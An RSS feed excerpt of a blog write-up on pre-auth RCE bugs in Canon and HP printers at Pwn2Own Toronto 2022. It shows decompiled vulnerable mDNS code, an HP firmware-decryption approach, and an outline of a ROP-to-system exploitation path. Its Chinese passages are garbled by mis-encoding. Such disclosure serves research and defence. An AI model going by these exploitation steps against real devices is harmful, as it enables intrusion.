    &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rest_scan_send_scan_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v24&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;rest_scan_vp_thread_created&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rest_scan_send_err_reply&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;400&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;‰ΩÜÁï∂Âú® &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[2]&lt;/code&gt; ËôïÁêÜ pathinfo ÊôÇÔºå‰∏¶Ê≤íÊúâÊ™¢Êü•Èï∑Â∫¶Ôºå‰∏¶‰∏îÁõ¥Êé•Ë§áË£ΩÂà∞ local buffer(first_path_info[32]) ‰∏≠ÔºåÂ∞éËá¥ stack overflow„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Exploitation&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;ÊàëÂÄëÂèØ‰ª•ÊßãÈÄ†ÂæàÈï∑ÁöÑ request Âà∞ /Scan/Jobs/ ‰æÜËß∏ÁôºÊºèÊ¥ûÔºå‰∏¶‰∏îË©≤ËôïÊ≤íÊúâ Stack Guard ‰πüÊ≤íÊúâ ASLRÔºåÂèØ‰ª•Áõ¥Êé•Ë¶ÜËìã return addressÔºåÈÄôÈÇäÂè™ÈúÄË¶ÅÂÅö ROP Ë¶ÜËìãÊéâ strncmp ÁöÑ GOT Âà∞ system ÂæåÔºåÂ∞±ÂèØ‰ª•ÈÄèÈÅé &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/Copy/{cmd}&lt;/code&gt; ‰æÜÂü∑Ë°å‰ªªÊÑèÊåá‰ª§‰∫Ü„ÄÇ&lt;/p&gt;

&lt;p&gt;‰∏çÈÅéÊúÄÁµÇÈÄôÂÄãÊºèÊ¥ûËàáÂÖ∂‰ªñÈöä‰ºçÊíûÊ¥û‰∫Ü„ÄÇ&lt;/p&gt;

&lt;h2 id=&quot;summary&quot;&gt;Summary&lt;/h2&gt;
&lt;p&gt;Âæû Pwn2Own Austin 2021 Âà∞ Pwn2Own Toronto 2022 ÁöÑÁµêÊûúÁúã‰∏ã‰æÜÔºåÂç∞Ë°®Ê©üÂÆâÂÖ®‰æùËàäÊòØÂÆπÊòìË¢´ÂøΩÁï•ÁöÑÔºåÁü≠Áü≠‰∏ÄÂπ¥ÈñìÔºåËÉΩÊâì‰∏ãÂç∞Ë°®Ê©üÁöÑÈöä‰ºç‰πüÂ§ßÂπÖÂ¢ûÂä†ÔºåÁîöËá≥Âà∞Á¨¨‰∏âÂπ¥ &lt;a href=&quot;https://www.zerodayinitiative.com/blog/2023/10/23/pwn2own-toronto-2023-the-schedule&quot;&gt;Pwn2Own Toronto 2023&lt;/a&gt; ‰πüÈÇÑÊòØË¢´Ë®±Â§öÈöä‰ºçÊâæÂà∞ÊºèÊ¥ûÔºåÊúÄÂæå‰πüÂª∫Ë≠∞Â§ßÂÆ∂Â¶ÇÊûúÊúâ‰ΩøÁî®Âà∞ÈÄô‰∫õ IoT Ë®≠ÂÇôÔºåÁõ°ÈáèÊää‰∏çÂøÖË¶ÅÁöÑÊúçÂãôÈóúÈñâ‰∏¶‰∏îË®≠Â•ΩÈò≤ÁÅ´ÁâÜÂèäÂÅöÂ•ΩÊ¨äÈôêÊéßÁÆ°Ôºå‰ª•Ê∏õÂ∞ëË¢´ÊîªÊìäÁöÑÂèØËÉΩ„ÄÇ&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2023/11/06/your-printer-is-not-your-printer-hacking-printers-pwn2own-part2/</link>
                <guid>https://devco.re/blog/2023/11/06/your-printer-is-not-your-printer-hacking-printers-pwn2own-part2</guid>
                <pubDate>Mon, 06 Nov 2023 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Your printer is not your printer ! - Hacking Printers at Pwn2Own Part II</title>
                <description>&lt;p&gt;&lt;a href=&quot;/blog/2023/11/06/your-printer-is-not-your-printer-hacking-printers-pwn2own-part2-en/&quot;&gt;English Version&lt;/a&gt;, &lt;a href=&quot;/blog/2023/11/06/your-printer-is-not-your-printer-hacking-printers-pwn2own-part2/&quot;&gt;‰∏≠ÊñáÁâàÊú¨&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Hacking Printers at Pwn2Own Toronto 2022&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Based on our &lt;a href=&quot;/blog/2023/10/05/your-printer-is-not-your-printer-hacking-printers-pwn2own-part1-en/&quot;&gt;previous research&lt;/a&gt;, we also discovered Pre-auth RCE vulnerabilities(&lt;a href=&quot;https://www.zerodayinitiative.com/advisories/ZDI-23-553/&quot;&gt;(CVE-2023-0853&lt;/a&gt;„ÄÅ&lt;a href=&quot;https://www.zerodayinitiative.com/advisories/ZDI-23-554/&quot;&gt;CVE-2023-0854&lt;/a&gt;) in other models of Canon printers. For the HP vulnerability, we had a collision with another team. In this section, we will detail the Canon and &lt;a href=&quot;https://nvd.nist.gov/vuln/detail/CVE-2023-35178&quot;&gt;HP vulnerabilities&lt;/a&gt; we exploited during Pwn2own Toronto.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Pwn2Own Toronto 2022 Target&lt;/li&gt;
&lt;/ul&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Target&lt;/th&gt;
      &lt;th&gt;Price&lt;/th&gt;
      &lt;th&gt;Master of Pwn Points&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;HP Collor LaserJet Pro M479fdw&lt;/td&gt;
      &lt;td&gt;$20000&lt;/td&gt;
      &lt;td&gt;2&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Lexmark MC3224i&lt;/td&gt;
      &lt;td&gt;$20000&lt;/td&gt;
      &lt;td&gt;2&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Canon imageCLASS MF743Cdw&lt;/td&gt;
      &lt;td&gt;$20000&lt;/td&gt;
      &lt;td&gt;2&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h2 id=&quot;analysis&quot;&gt;Analysis&lt;/h2&gt;

&lt;h3 id=&quot;canon&quot;&gt;Canon&lt;/h3&gt;
&lt;h4 id=&quot;firmware-extract&quot;&gt;Firmware Extract&lt;/h4&gt;

&lt;p&gt;Same as 2021, you can refer to &lt;a href=&quot;/blog/2023/10/05/your-printer-is-not-your-printer-hacking-printers-pwn2own-part1/&quot;&gt;Part I&lt;/a&gt;. The current version is v11.04.&lt;/p&gt;

&lt;h3 id=&quot;hp&quot;&gt;HP&lt;/h3&gt;
&lt;p&gt;The firmware can be obtained from HP‚Äôs official &lt;a href=&quot;https://ftp.ext.hp.com/pub/networking/software/pfirmware/pfirmware.glf&quot;&gt;website&lt;/a&gt;. However, unlike in 2021, it cannot be directly extracted using binwalk. The firmware is encrypted with AES, and it‚Äôs hard to decrypt directly from the information.&lt;/p&gt;

&lt;p&gt;At first, our thought was to look for the firmware of the same series to see if there was an unencrypted version. However, there was no such firmware on HP‚Äôs official website that met our criteria. We initially considered tearing down the printer to dump the firmware, but during our search on Google, we stumbled upon an older mirror site. This site enabled directory listing, allowing us to access all the firmware stored on that mirror website.&lt;/p&gt;

&lt;p&gt;However, the problem was that the mirror site only mirrored up to 2016 and didn‚Äôt have the latest information. Still, we later managed to glean the official directory structure from the website information, which helped us to obtain an unencrypted firmware from a similar series.‚Äù&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231106/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After our analysis, we found decryption-related information in the Firmware from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fwupd&lt;/code&gt;. By reverse engineering, we were able to identify the encryption method and the Key. We can use the key to decrypt the target version of the Firmware.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231106/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;hp-collor-laserjet-pro-m479fdw&quot;&gt;HP Collor LaserJet Pro M479fdw&lt;/h4&gt;
&lt;ul&gt;
  &lt;li&gt;OS - Linux Base&lt;/li&gt;
  &lt;li&gt;ARMv7 32bit little-endian&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;vulnerability--exploitation&quot;&gt;Vulnerability &amp;amp; Exploitation&lt;/h2&gt;

&lt;h3 id=&quot;canon-1&quot;&gt;Canon&lt;/h3&gt;

&lt;h4 id=&quot;mdns-cve-2023-0853&quot;&gt;mDNS (CVE-2023-0853)&lt;/h4&gt;
&lt;p&gt;Ôº∑e found a stack overflow on mDNS. mDNS protocol resolves hostnames to IP address within small networks that do not include a local name server and are usually used for Apple and IoT devices.&lt;/p&gt;

&lt;p&gt;It is enabled on Canon ImageCLASS MF743Cdw(Version 11.04) by default.&lt;/p&gt;

&lt;p&gt;Before we look at the detail of the vulnerability we need to talk about mDNS Packet Structure.&lt;/p&gt;

&lt;p&gt;mDNS is based on the DNS packet format defined in RFC1035 Section 4 for both queries and responses. mDNS queries and responses utilize the DNS header format defined in RFC1035 with exceptions noted below:&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;The packet format:&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    +---------------------+
    |        Header       |
    +---------------------+
    |       Question      | the question for the name server
    +---------------------+
    |        Answer       | RRs answering the question
    +---------------------+
    |      Authority      | RRs pointing toward an authority
    +---------------------+
    |      Additional     | RRs holding additional information
    +---------------------+
(diagram from https://www.ietf.org/rfc/rfc1035.txt)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;The header contains the following fields:&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;                                    1  1  1  1  1  1
      0  1  2  3  4  5  6  7  8  9  0  1  2  3  4  5
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                      ID                       |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |QR|   Opcode  |AA|TC|RD|RA|   Z    |   RCODE   |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                    QDCOUNT                    |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                    ANCOUNT                    |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                    NSCOUNT                    |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                    ARCOUNT                    |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
(diagram from https://www.ietf.org/rfc/rfc1035.txt)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The answer section contains RRs that answer the question.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Resource record format:&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;                                    1  1  1  1  1  1
      0  1  2  3  4  5  6  7  8  9  0  1  2  3  4  5
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                                               |
    /                                               /
    /                      NAME                     /
    |                                               |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                      TYPE                     |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                     CLASS                     |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                      TTL                      |
    |                                               |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                   RDLENGTH                    |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--|
    /                     RDATA                     /
    /                                               /
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
(diagram from https://www.ietf.org/rfc/rfc1035.txt)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The RDATA section varies depending on the ‚Äòtype‚Äô. When type=NSEC, its format is as follows:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;   The RDATA of the NSEC RR is as shown below:

                        1 1 1 1 1 1 1 1 1 1 2 2 2 2 2 2 2 2 2 2 3 3
    0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   /                      Next Domain Name                         /
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   /                       Type Bit Maps                           /
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
(diagram from https://www.ietf.org/rfc/rfc4034.txt)

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;More details can reference to RFC6762.&lt;/p&gt;

&lt;p&gt;Other element is not important in this vulnerability, so we won‚Äôt explain more here. More detail can be found at &lt;a href=&quot;https://datatracker.ietf.org/doc/rfc6762/&quot;&gt;RFC6762&lt;/a&gt;, &lt;a href=&quot;https://datatracker.ietf.org/doc/rfc1035/&quot;&gt;RFC1035&lt;/a&gt; and &lt;a href=&quot;https://datatracker.ietf.org/doc/rfc4034/&quot;&gt;RFC4034&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Where is the bug&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;When Canon ImageCLASS MF743Cdw is parsing the Answer field (type NSEC) in mDNS header, there is a stack overflow.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231106/3.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In the function &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bnMdnsParseAnswers&lt;/code&gt;, it will parse answer section.&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__fastcall&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;bnMdnsParseAnswers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;netbios_header&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mdns_packet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ppayloadlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;netbios_header&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pmdns_header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;_WORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;anwser_rr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;rrlist&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;_DWORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pinfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nsec_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;256&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// ------ fixed size on the stack&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
    
  &lt;span class=&quot;n&quot;&gt;_mdns_packet&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mdns_packet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;p_payloadlen&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ppayloadlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;p_mdns_header&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pmdns_header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;anwser_cnt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;anwser_rr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v66&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;cur_ptr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mdns_packet&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pinfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v9&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;v11&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v9&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rrlist&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;aBnmdnsparseans&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v67&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v11&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;anwser_cnt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v67&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pname&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;28&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LABEL_36&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x21&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;47&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;                         &lt;span class=&quot;c1&quot;&gt;// NSEC&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LABEL_95&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v62&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v63&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
